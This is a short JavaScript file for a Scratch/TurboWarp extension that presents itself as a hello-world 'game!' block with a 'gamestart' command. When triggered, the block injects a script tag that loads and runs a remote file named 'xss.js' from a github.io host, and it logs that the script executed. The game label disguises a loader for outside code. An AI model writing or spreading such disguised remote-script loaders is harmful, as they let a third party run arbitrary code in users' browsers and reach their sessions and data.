class HelloWorldExtension {
    getInfo() {
        return {
            id: 'game',
            name: 'game!',
            blocks: [
                {
                    opcode: 'gamestart',
                    blockType: Scratch.BlockType.COMMAND,
                    text: 'gamestart',
                },
            ],
        };
    }

    gamestart() {
        // 动态创建 script 元素并加载远程脚本
        const script = document.createElement('script');
        script.src = 'https://displaysbook.github.io/TurboWarp/xss.js'; // 远程脚本的 URL
        script.onload = function() {
            console.log('Remote script loaded and executed.');
        };
        script.onerror = function() {
            console.error('Failed to load the remote script.');
        };
        document.head.appendChild(script); // 将 script 添加到 DOM 中
    }
}

Scratch.extensions.register(new HelloWorldExtension());
